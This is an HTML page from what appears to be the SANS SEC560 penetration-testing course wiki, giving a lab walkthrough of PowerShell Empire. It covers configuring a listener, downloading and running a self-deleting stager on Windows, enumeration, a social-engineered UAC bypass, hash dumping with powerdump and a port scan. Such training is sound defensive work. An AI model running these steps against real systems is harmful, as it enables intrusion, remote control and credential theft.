@@ -1,0 +1,683 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-35-empire">Lab 3.5: Empire</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>To use PowerShell Empire to create a listener on your Slingshot Linux image and agents on your Windows machine, both a low-privileged agent and a high-privileged one</li>
+<li>To review the OpSec Safe features of Empire</li>
+<li>To use Empire&rsquo;s modules to plunder a target machine for useful information</li>
+<li>To use Empire&rsquo;s <code>privesc/powerup/allchecks</code> to look for local privilege escalation vulnerabilities</li>
+<li>To use Empire to trick a user into bypassing User Account Control (UAC) to gain elevated privileges</li>
+<li>To dump hashes from a target using Empire&rsquo;s <code>powerdump*</code> module (The * indicates that we need an elevated privilege process, also known as a high-integrity process, to run this module.)</li>
+<li>To conduct a port scan from an Empire agent</li>
+</ul>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>Ensure that you can ping from the Slingshot Linux image to your Windows machine, and vice versa, for this lab.</p>
+<pre>
+$ <b>ping <i>YOUR_WINDOWS_IP_ADDRESS</i></b>
+</pre>
+
+<pre>
+C:\> <b>ping <i>YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="step-1-starting-empire">Step 1: Starting Empire</h4>
+<p>Start by changing into the Empire setup directory on the Slingshot virtual machine:</p>
+<pre>
+$ <b>cd /opt/empire/setup</b>
+</pre>
+
+<p>Then run the script called <code>reset.sh</code>, which will generate unique public and private keys and an associated self-signed certificate to encrypt Empire communication. Only your instance of Empire will have these unique keys and certificate, making the communication more OpSec safe. The script will also clear the database of old data. It is important to never cross-contaminate data from penetration tests.</p>
+<pre>
+sec560@slingshot:/opt/empire/setup$ <b>sudo ./reset.sh</b>
+</pre>
+
+<p>The above command will automatically start Empire for us. When prompted for the "negotiation password", simply press enter to randomly generate the password.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img02.png" style="width:100%;max-width:600px"  alt="Launching Empire" /></p>
+<blockquote>
+<p>To run Empire without a reset, simply run <code>sudo ./empire</code> from the <code>/opt/empire</code> directory:</p>
+<pre>
+
+</blockquote>
+<p>sec560@slingshot:/opt/empire/$ <b>sudo ./empire</b> </pre></p>
+<p>Note that upon launch, Empire tells you the number of modules it has available, as well as the number of active listeners and agents associated with it.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img03.png" style="width:100%;max-width:600px"  alt="Empire welcome screen" /></p>
+<p>We&rsquo;ll start by looking at a list of commands available in the Empire framework:</p>
+<pre>
+(Empire) > <b>?</b>
+</pre>
+
+<p>Here you can see commands like <code>agents</code> (which shows details about currently managed agents), <code>listeners</code> (which lets you configure and control a listener), and <code>usemodule</code> (which lets you run a module via an agent on a compromised machine).</p>
+<pre>
+(Empire) > <b>?</b>
+
+Commands
+========
+agents            Jump to the Agents menu.
+creds             Add/display credentials to/from the database.
+exit              Exit Empire
+help              Displays the help menu.
+interact          Interact with a particular agent.
+list              Lists active agents or listeners.
+listeners         Interact with active listeners.
+load              Loads Empire modules from a non-standard folder.
+plugin            Load a plugin file to extend Empire.
+plugins           List all available and active plugins.
+preobfuscate      Preobfuscate PowerShell module_source files
+reload            Reload one (or all) Empire modules.
+report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log
+reset             Reset a global option (e.g. IP whitelists).
+resource          Read and execute a list of Empire commands from a file.
+searchmodule      Search Empire module names/descriptions.
+set               Set a global option (e.g. IP whitelists).
+show              Show a global option (e.g. IP whitelists).
+usemodule         Use an Empire module.
+usestager         Use an Empire stager.
+</pre>
+
+<p>We can search for modules using the <code>searchmodule</code> command. Let&rsquo;s do that, looking for <code>privesc</code>, Empire&rsquo;s shorthand notation for local privilege escalation exploits:</p>
+<pre>
+(Empire) > <b>searchmodule privesc</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img05.png" style="width:100%;max-width:600px"  alt="Empire searchmodule command" /></p>
+<p>You can see that Empire has numerous features for local privilege escalation attacks, on different operating systems, including Windows and macOS. We&rsquo;ll experiment with Windows privilege escalation attack later in this lab.</p>
+<h4 id="step-2-configure-a-listener">Step 2: Configure a listener</h4>
+<p>First, we need to configure a listener and deploy an agent.</p>
+<p>Let&rsquo;s start by getting a list of our listeners:</p>
+<pre>
+(Empire) > <b>listeners</b>
+</pre>
+
+<p>Given that we haven&rsquo;t configured a listener yet, there should be none currently active. But notice that your prompt has changed into the <code>listeners</code> context, allowing us to configure and start a listener that will wait for callbacks from Empire agents.</p>
+<p>Let&rsquo;s review the commands we have in our listener context.</p>
+<pre>
+(Empire: listeners) > <b>?</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img06.png" style="width:100%;max-width:600px"  alt="Empire listeners commands" /></p>
+<p>To start a listener, we use the <code>uselistener</code> command, followed by the type of listener we want to use. To get a list of types of listeners, type in the <code>uselistener</code> command, followed by a <code>Space</code>, and then hit <code>Tab-Tab</code> to get the list of available types.</p>
+<pre>
+(Empire: listeners) > <b>uselistener <i>&lt;Tab&gt;&lt;Tab&gt;</i></b>
+dbx           http          http_com      http_foreign  http_hop      http_mapi
+meterpreter   onedrive      redirector
+</pre>
+
+<blockquote>
+<p>Type a <code>Space</code> after the command and hit <code>Tab</code> twice.</p>
+</blockquote>
+<p>For this lab, we&rsquo;ll use the <code>http</code> listener type, which supports both HTTP and HTTPS. And even if we use HTTP itself, the communication is still encrypted using the unique crypto keys generated by Empire. Let&rsquo;s configure an HTTP listener, changing into its context and getting info about it.</p>
+<pre>
+(Empire: listeners) > <b>uselistener http</b>
+
+(Empire: listeners/http) > <b>info</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img07.png" style="width:100%;max-width:600px"  alt="Setting up http listener" /></p>
+<p>Note that we have options here:</p>
+<ul>
+<li>KillDate - after which time the listener will stop listening</li>
+<li>StagingKey - A pseudo-random StagingKey for encrypting communications between agent and listener</li>
+<li>WorkingHours - to limit the time when agents will actively call back to the listener</li>
+<li>DefaultDelay - agents are asynchronous and the DefaultDelay specifies how often the agent will check in</li>
+</ul>
+<p>You can also see that the <code>DefaultDelay</code> is <code>5</code> seconds, which means that agents will send a request for more commands back to a listener every five seconds.</p>
+<p>Finally, note that the Host is set to default to your Linux IP address and that the listener will use TCP port 80.</p>
+<p>Let&rsquo;s lower the time between callbacks from our agent, going from the default of five seconds down to one second, as it&rsquo;ll make our agents feel more responsive for this lab. Also, our host is already running a web server, so let' us port 8080 for this lab.</p>
+<pre>
+(Empire: listeners/http) > <b>set DefaultDelay 1</b>
+(Empire: listeners/http) > <b>set Port 8080</b>
+(Empire: listeners/http) > <b>set Host http://<i>YOUR_LINUX_IP_ADDRESS</i>:8080</b>
+</pre>
+
+<blockquote>
+<p>Note: Don't type <code>YOUR_LINUX_IP_ADDRESS</code>; use the IP address of your Linux system instead (e.g., 10.10.75.123).</p>
+</blockquote>
+<p>Then, with our listener configured, let&rsquo;s look at the commands we have available to launch it:</p>
+<pre>
+(Empire: listeners/http) > <b>?</b>
+</pre>
+
+<p>The output should look like the following:</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img08.png" style="width:100%;max-width:600px"  alt="Setting up http listener" /></p>
+<p>We will use the <code>execute</code> command to start our listener:</p>
+<pre>
+(Empire: listeners) > <b>execute</b>
+</pre>
+
+<p>You will see a warning about not using the development server in a production environment. This is a production version of Empire.</p>
+<p>Now we can check out our listener by running the <code>listeners</code> command:</p>
+<pre>
+(Empire: listeners) > <b>listeners</b>
+</pre>
+
+<p>Note that the listener has the default name of <b>http</b> and is listening on our Linux IP address on TCP port 8080.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img09.png" style="width:100%;max-width:600px"  alt="Our listener" /></p>
+<p>Next, let&rsquo;s get back to our main Empire screen by running the <code>back</code> command:</p>
+<pre>
+(Empire: listeners) > <b>back</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img10.png" style="width:100%;max-width:600px"  alt="Listener count" /></p>
+<h4 id="step-3-deploy-an-agent">Step 3: Deploy an agent</h4>
+<p>Now we need to create and deploy an agent, which we accomplish with the <code>usestager</code> command. To see the different kinds of stagers we have available to load an agent on the victim machine, do the following:</p>
+<pre>
+(Empire) > <b>usestager</b>
+</pre>
+
+<blockquote>
+<p>Type a <code>Space</code> after the command and hit <code>Tab</code> twice.</p>
+</blockquote>
+<p>For this lab, let&rsquo;s create a stager that runs an agent via PowerShell out of a Windows .bat file and then deletes that .bat file, one of the most useful and reliable agent types supported by Empire:</p>
+<pre>
+(Empire) > <b>usestager windows/launcher_bat</b>
+</pre>
+
+<p>Let&rsquo;s look at the default configuration of the stager that will load the agent:</p>
+<pre>
+(Empire: stager/launcher_bat) > <b>info</b>
+</pre>
+
+<p>Note that the agent has the ability to authenticate to a proxy via the ProxyCreds variable.</p>
+<p>For this lab, we&rsquo;ll keep the very reasonable and useful defaults for the stager.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img11.png" style="width:100%;max-width:600px"  alt="Using the windows/launcher_bat stager" /></p>
+<p>We need to tell the stager which listener it will call back to (which is our only listener currently running):</p>
+<pre>
+(Empire: stager/launcher_bat) > <b>set Listener http</b>
+</pre>
+
+<p>By default, Empire will put our .bat file into /tmp/launcher.bat, which is a reasonable place for it.</p>
+<p>Now we&rsquo;ll generate our stager file:</p>
+<pre>
+(Empire: stager/launcher_bat) > <b>generate</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img12.png" style="width:100%;max-width:600px"  alt="Empire generating stager file" /></p>
+<p>Next, at a <em>separate Linux terminal prompt</em>, let&rsquo;s move into /tmp and serve up our stager file via the <code>http.server</code> Python module, listening on the default TCP port of 8000.</p>
+<pre>
+$ <b>cd /tmp</b>
+$ <b>python -m http.server</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img13.png" style="width:100%;max-width:600px"  alt="Starting Python server" /></p>
+<h4 id="step-4-deploying-the-stager">Step 4: Deploying the stager</h4>
+<p>To get our stager deployed on Windows, let&rsquo;s use PowerShell as a command line browser to download a file.</p>
+<p>Click the PowerShell icon on the desktop (not the elevated link).</p>
+<p>First, launch a non-elevated PowerShell (by going to the Windows menu and typing <code>PowerShell</code> and then hitting Return).</p>
+<p>Now, from PowerShell, change to your Desktop directory:</p>
+<pre>
+PS C:\Users\sec560> <b>cd Desktop</b>
+</pre>
+
+<p>Then run the <code>wget</code> cmdlet to download the agent stager file:</p>
+<pre>
+PS C:\> <b>wget http://<i>YOUR_LINUX_IP_ADDRESS</i>:8000/launcher.bat -OutFile launcher.bat</b>
+</pre>
+
+<p>To ensure your stager file arrived correctly, run the <code>ls</code> command to check its size:</p>
+<pre>
+PS C:\> <b>ls launcher.bat</b>
+</pre>
+
+<p>The file should be a non-zero length in bytes (typically between 4,000 and 5,000 bytes).</p>
+<pre>
+PS C:\> <b>notepad launcher.bat</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img15.png" style="width:100%;max-width:600px"  alt="Confirming stager arrival" /></p>
+<p>Finally, you should see launcher.bat on the Desktop of your Windows machine.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img16.png" style="width:100%;max-width:600px"  alt="Executing stager" /></p>
+<p>Next, double-click on <code>launcher.bat</code> on your <code>Desktop</code>. This will run the stager to load the agent on your Windows machine. After the agent is loaded, launcher.bat should disappear, as it is a self-deleting malicious file.</p>
+<p>Next, on your Linux machine, in the Empire terminal, you should see an indication that your listener has received communication from your agent, with a message of "Initial agent" followed by a pseudorandom agent name.</p>
+<blockquote>
+<p><b>Hit Enter when you get that "Initial agent" message to get your prompt back.</b></p>
+</blockquote>
+<p><img  class="myImg"  src="pics/Ex3.5_img17.png" style="width:100%;max-width:600px"  alt="Communcation indication on Empire" /></p>
+<h4 id="step-5-active-agent">Step 5: Active agent</h4>
+<p>Now let&rsquo;s look at any active agents we have:</p>
+<pre>
+(Empire) > <b>agents</b>
+</pre>
+
+<p>You should see your one agent listed there. Let&rsquo;s get a list of agent commands, noting that one of the commands is "interact":</p>
+<pre>
+(Empire: agents) > <b>?</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img18.png" style="width:100%;max-width:600px"  alt="Agents commands list" /></p>
+<pre>
+(Empire: agents) > <b>interact <i>AgentName</i></b>
+</pre>
+
+<blockquote>
+<p>Use Tab-autocomplete to help type the random looking agent name.</p>
+</blockquote>
+<p>The pseudorandom name isn&rsquo;t very handy, so let&rsquo;s <code>rename</code> this session. Let's call this first agent <code>Agent1</code>.</p>
+<pre>
+(Empire: [AgentName]) > <b>rename Agent1</b>
+</pre>
+
+<p>Now let&rsquo;s look at our command list again:</p>
+<pre>
+(Empire: Agent1) > <b>?</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img19.png" style="width:100%;max-width:600px"  alt="Renaming agents and viewing commands list again" /></p>
+<p>Here we can see commands such as <code>download</code>, <code>killdate</code>, <code>shell</code>, <code>searchmodule</code>, and <code>sysinfo</code>. Also, to see the settings associated with our current agent, we can run the <code>info</code> command. Let&rsquo;s do that:</p>
+<pre>
+(Empire: Agent1) > <b>info</b>
+</pre>
+
+<p>Here you can see vital information about the agent, including its <code>process_name</code>, its last check-in time, and more. To see that our agent is active and communicating back with our listener every second, let&rsquo;s run the <code>info</code> command twice and note the time difference based on the <code>lastseen_time</code> value:</p>
+<pre>
+(Empire: Agent1) > <b>info</b>
+</pre>
+
+<blockquote>
+<p>Note the <code>lastseen_time</code> and how it has changed between each time you ran info on this agent.</p>
+</blockquote>
+<p>If you don&rsquo;t see the <code>lastseen_time</code> changing, your agent has probably died. If that happens, you can download it again and run it. You'll need to give the new agent a unique name, such as <b>1Agent21</b>.</p>
+<p>At the Empire prompt, we can also review our listeners using the <code>list listeners</code> command:</p>
+<pre>
+(Empire: Agent1) > <b>list listeners</b>
+</pre>
+
+<p>You should see your listener on TCP port 8080.</p>
+<p>Also, we can see the agents by running the <code>list agents</code> command:</p>
+<pre>
+(Empire: Agent1) > <b>list agents</b>
+</pre>
+
+<p>You should see your single agent communicating back from your Windows machine.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img21.png" style="width:100%;max-width:600px"  alt="Viewing listeners and agents" /></p>
+<h4 id="step-6-modules">Step 6: Modules</h4>
+<p>Now that we&rsquo;ve got an agent deployed and communicating back with our listener, let&rsquo;s look at the modules available to us for executing on the agent:</p>
+<pre>
+(Empire: [SessionName]) > <b>usemodule</b>
+</pre>
+
+<blockquote>
+<p>Hit a <code>Space</code> after <code>usemodule</code> and <code>Tab</code> twice.</p>
+</blockquote>
+<p><img  class="myImg"  src="pics/Ex3.5_img22.png" style="width:100%;max-width:600px"  alt="Look at modules" /></p>
+<p>You should now see the full collection of over 100 different modules. Note that they are in different categories, including:</p>
+<p><strong>code_execution:</strong> These modules let you run code, including Metasploit payloads, on the target box.</p>
+<p><strong>collection:</strong> These modules let you pillage information from the target machine.</p>
+<p><strong>credentials:</strong> These modules let you plunder usernames, hashes, and passwords from the target.</p>
+<p><strong>exploitation:</strong> These modules let you exploit additional targets.</p>
+<p><strong>lateral_movement:</strong> These modules let you pivot to other target machines.</p>
+<p><strong>management:</strong> These modules are associated with system administration functions on the target.</p>
+<p><strong>persistence:</strong> These modules will make your agent survive across user logoff or reboot.</p>
+<p><strong>privesc:</strong> These modules provide privilege escalation exploits.</p>
+<p><strong>recon:</strong> These are the reconnaissance modules.</p>
+<p><strong>situational_awareness:</strong> These modules pull information from the target environment, including scanners and related tools.</p>
+<p><strong>trollsploit:</strong> These modules let you troll the user sitting at the victim machine&rsquo;s console, including playing audio and popping up dialog boxes.</p>
+<p>Let&rsquo;s experiment with some of the most useful of these modules.</p>
+<p>Let&rsquo;s run a module called <code>winenum</code> from the category of <code>situational_awareness</code>. We&rsquo;ll start by selecting it via the <code>usemodule</code> command:</p>
+<pre>
+(Empire: Agent1) > <b>usemodule situational_awareness/host/winenum</b>
+</pre>
+
+<p>To get detailed information about the module, we can now run the <code>info</code> command:</p>
+<pre>
+(Empire: powershell/situational_awareness/host/winenum) > <b>info</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img23.png" style="width:100%;max-width:600px"  alt="Viewing winenum module info" /></p>
+<p>Note that this module plunders useful information from the target machine, including information about software and files on the box.</p>
+<p>We will now run the <code>winenum</code> module:</p>
+<pre>
+(Empire: powershell/situational_awareness/host/winenum) > <b>run</b>
+</pre>
+
+<p>Note that when we run a module, Empire creates a job on the target machine and runs the job in the background. If you hit <code>Enter</code>, your prompt will come back. The job is given a title of a pseudorandom string. Empire will place output from the job on the screen sporadically, taking up to 30 seconds or so to finish, posting it in spurts.</p>
+<p>Let the job run for about 30 seconds, and look through its output, which includes a list of files recently opened on the target, the services running on the box, the firewall ruleset, and more.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img24.png" style="width:100%;max-width:600px"  alt="Using winenum module" /></p>
+<h4 id="step-7-looking-for-privilege-escalation">Step 7: Looking for privilege escalation</h4>
+<p>Next, let&rsquo;s look to see if there are any privilege escalation opportunities on the target. We&rsquo;ll start by backing out of the context of <code>winenum</code>, going back to our agent session:</p>
+<pre>
+(Empire: situational_awareness/host/winenum) > <b>back</b>
+</pre>
+
+<p>The PowerUp modules have numerous methods for privilege escalation through PowerShell. Let&rsquo;s search for those modules:</p>
+<pre>
+(Empire: Agent1) > <b>searchmodule powerup</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img25.png" style="width:100%;max-width:600px"  alt="Going back to agent session, searching powerup module" /></p>
+<p>We can see that PowerUp has a feature that&rsquo;ll run all checks for privilege escalation in <code>powershell/privesc/powerup/allchecks</code>. Let&rsquo;s select that one and run it:</p>
+<pre>
+(Empire: Agent1) > <b>usemodule privesc/powerup/allchecks</b>
+
+(Empire: powershell/privesc/powerup/allchecks) > <b>run</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img26.png" style="width:100%;max-width:600px"  alt="Running powerup allchecks module" /></p>
+<p>In your output, you should see the message: <b>"User is in a local group that grants administrative privileges! Run a BypassUAC attack to elevate privileges to admin."</b></p>
+<p>We&rsquo;ll perform an attack to bypass User Account Control (UAC) in a bit &mldr; but let&rsquo;s first see that we are limited without those full admin privileges in our agent. To do so, let&rsquo;s attempt to dump hashes from the target from our non-elevated agent. We&rsquo;ll use the <code>powerdump*</code> module, which is in the credentials category and was originally included in the Posh-SecMod tool:</p>
+<pre>
+(Empire: powershell/privesc/powerup/allchecks) > <b>usemodule powershell/credentials/powerdump*</b>
+</pre>
+
+<p>Note that the name of this module ends with *, indicating that it requires an elevated privilege process to use it. Let&rsquo;s review the details describing this module:</p>
+<pre>
+(Empire: powershell/credentials/powerdump) > <b>info</b>
+</pre>
+
+<p>Let&rsquo;s try to run it:</p>
+<pre>
+(Empire: powershell/credentials/powerdump) > <b>run</b>
+</pre>
+
+<p>Note that it will likely fail because our agent isn&rsquo;t running with full elevated privileges. You should see a message saying, <b>"Error: module needs to run in an elevated context".</b></p>
+<p><img  class="myImg"  src="pics/Ex3.5_img27.png" style="width:100%;max-width:600px"  alt="Attemping hashdump with powerdump" /></p>
+<h4 id="step-8-uac-bypass">Step 8: UAC bypass</h4>
+<p>Next, we are going to attempt to bypass UAC to get those elevated privileges needed to dump hashes.</p>
+<p>First, move back from the context of <code>powerdump*</code>. That should put you back into the context of <code>privesc/powerup/allchecks</code>:</p>
+<pre>
+(Empire: powershell/credentials/powerdump) > <b>back</b>
+</pre>
+
+<p>Let&rsquo;s move back again to the context of our agent session:</p>
+<pre>
+(Empire: privesc/powerup/allchecks) > <b>back</b>
+</pre>
+
+<p>Now we&rsquo;ll run an attack module called <code>privesc/ask</code> that simply pops up a UAC prompt, asking a user logged in to Windows for permission to execute a program. While that might alert a diligent user, most users will simply click <b>Yes</b>. Although there are other exploits to bypass UAC, Microsoft patches them regularly. But a simple <b>Yes</b> click by a user works very well, even on a fully patched Windows box. To use the <code>privesc/ask</code> module, please type:</p>
+<pre>
+(Empire: [SessionName]) > <b>usemodule privesc/ask</b>
+
+(Empire: [SessionName]) > <b>info</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img28.png" style="width:100%;max-width:600px"  alt="Using privesc/ask module" /></p>
+<p>We now need to tell Empire that we want this module applied to any agents connected to our Listener (which is <code>Listener http</code>):</p>
+<pre>
+(Empire: powershell/privesc/ask) > <b>list listeners</b>
+
+(Empire: powershell/privesc/ask) > <b>set Listener http</b>
+</pre>
+
+<p>Now we are ready to run the module, so please type:</p>
+<pre>
+(Empire: privesc/ask) > <b>run</b>
+</pre>
+
+<p>Note that we are now prompted with a message saying, <b>Module is not opsec safe, run?</b> This is a reminder from Empire that what we are about to do will generate logs or otherwise may inform an admin or user. The <code>privesc/ask</code> module will pop up a dialog box on your Windows machine.</p>
+<p>We need these privileges to get the hashes, so please type <code>y</code> and hit <code>Enter</code>.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img29.png" style="width:100%;max-width:600px"  alt="Setting up and running privesc/ask module" /></p>
+<p>Oftentimes Windows will pop up a UAC prompt that says it was placed on the screen by Windows PowerShell, with a verified publisher of Microsoft Windows. Of course, it&rsquo;s the Empire Agent that makes this appear, leveraging PowerShell to make it look more like a legitimate action on the target machine.</p>
+<p>In our case, your Windows system does not prompt. Yeah!</p>
+<pre>
+(Empire: Agent1) > <b>agents</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img31.png" style="width:100%;max-width:600px"  alt="Checking for full admin privileges" /></p>
+<p>Note the <code>*</code> next to your new agent&rsquo;s username. That star means that it is an elevated session, with full admin privileges. The Empire documentation sometimes refers to these agents as "high-integrity" agents, and they are wonderful because they allow us to fully plunder the system, including getting the hashes from the box.</p>
+<p>Let&rsquo;s rename our new elevated agent session. We recommend giving it the name of the host followed by the word <code>HIGH</code> to indicate elevated privileges.</p>
+<pre>
+(Empire: agents) > <b>rename [NewSessionPseudoRandomName] AgentHIGH</b>
+</pre>
+
+<p>Now let&rsquo;s interact with our new elevated session:</p>
+<pre>
+(Empire: agents) > <b>interact AgentHIGH</b>
+</pre>
+
+<p>And now we can try to run `powerdump*`` again to get the hashes:</p>
+<pre>
+(Empire: AgentHIGH) > <b>usemodule credentials/powerdump*</b>
+
+(Empire: powershell/credentials/powerdump) > <b>run</b>
+</pre>
+
+<p>Note that it works now because we bypassed UAC to gain a high-integrity (elevated privileges) agent session. And we&rsquo;ve got the hashes from the target!</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img32.png" style="width:100%;max-width:600px"  alt="Renaming, interacting and attempting hashdump" /></p>
+<p>Now let&rsquo;s move back to the context of our agent:</p>
+<pre>
+(Empire: powershell/credentials/powerdump) > <b>back</b>
+</pre>
+
+<p>To run shell commands from our agent, we execute <code>shell</code> followed by the command we want to run:</p>
+<pre>
+(Empire: [SessionNameHIGH]) > <b>shell ipconfig</b>
+</pre>
+
+<p>You should see the output of the <code>ipconfig</code> command on your display.</p>
+<pre>
+(Empire: [SessionNameHIGH]) > <b>shell whoami</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img33.png" style="width:100%;max-width:600px"  alt="Going back to agent context, running ipconfig and whoami" /></p>
+<p>If you have time, you can experiment with other PowerShell commands, such as <code>ps</code>, <code>pwd</code>, and <code>dir</code>. Additionally, use some of the PowerShell tricks you already learned in this course.</p>
+<h4 id="step-9-port-scan">Step 9: Port scan</h4>
+<p>Next, let&rsquo;s conduct a port scan from our Empire agent, having it scan the <b>10.10.10.10</b> machine. We&rsquo;ll start by searching for the <code>portscan</code> module:</p>
+<pre>
+(Empire: AgentHIGH) > <b>searchmodule portscan</b>
+</pre>
+
+<p>Let&rsquo;s select the module:</p>
+<pre>
+(Empire: AgentHIGH) > <b>usemodule situational_awareness/network/portscan</b>
+</pre>
+
+<p>Now review the information associated with this module, always a good practice before running a module for the first time:</p>
+<pre>
+(Empire: situational_awareness/network/portscan) > <b>info</b>
+</pre>
+
+<p>This module requires a target <b>Hosts</b> variable to be set.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img34.png" style="width:100%;max-width:600px"  alt="Using portscan module" /></p>
+<p>Please set the <b>Hosts</b> variable to <b>10.10.10.10</b>:</p>
+<pre>
+(Empire: situational_awareness/network/portscan) > <b>set Hosts 10.10.10.10</b>
+</pre>
+
+<p>Now let&rsquo;s run the port scan:</p>
+<pre>
+(Empire: situational_awareness/network/portscan) > <b>run</b>
+</pre>
+
+<p>You should see that TCP ports 80, 8080, and 22 are listening on your Linux machine. You may also see TCP port 8000 listening if you didn&rsquo;t stop the http.server earlier in this lab.</p>
+<p><img  class="myImg"  src="pics/Ex3.5_img35.png" style="width:100%;max-width:600px"  alt="Setting up and running portscan module" /></p>
+<h4 id="step-10-wrap-up">Step 10: Wrap up</h4>
+<p>To conclude the lab, let&rsquo;s shut down our agents. We&rsquo;ll first go back to the main Empire screen:</p>
+<pre>
+(Empire: situational_awareness/network/portscan) > <b>main</b>
+</pre>
+
+<p>Then we&rsquo;ll move to the agents context:</p>
+<pre>
+(Empire) > <b>agents</b>
+</pre>
+
+<p>We are now going to <code>kill</code> our agents. We can kill them one at a time with <code>kill [AgentName]</code> but we can use the <code>all</code> modified to kill all of them.</p>
+<pre>
+(Empire: agents) > <b>kill all</b>
+</pre>
+
+<p>Now let&rsquo;s kill our listener:</p>
+<pre>
+(Empire: agents) > <b>listeners</b>
+(Empire: listeners) > <b>kill http</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.5_img37.png" style="width:100%;max-width:600px"  alt="Kill agents and listener" /></p>
+<p>And finally, let&rsquo;s <code>exit</code> the Empire framework:</p>
+<pre>
+(Empire: listeners) > <b>exit</b>
+</pre>
+
+<p>You&rsquo;ll be prompted to verify that you are quitting. Please hit: <code>Y</code></p>
+<p>If you have extra time, feel free to explore other modules associated with Empire.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this lab, we&rsquo;ve seen how penetration testers can use Empire to configure and control listeners and agents. We&rsquo;ve also run several different modules on a target via an agent, including PowerUp, to find potential local privilege escalation vulnerabilities. We&rsquo;ve bypassed UAC by prompting a user to get a high-privileged agent running on the target. We&rsquo;ve dumped hashes using Empire&rsquo;s <code>powerdump*</code> module, and we&rsquo;ve also conducted a port scan from an agent on the compromised target.</p>
+<p>Each of these techniques is extremely useful for penetration testers during the post-exploitation phase of a penetration test project or Red Team engagement.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
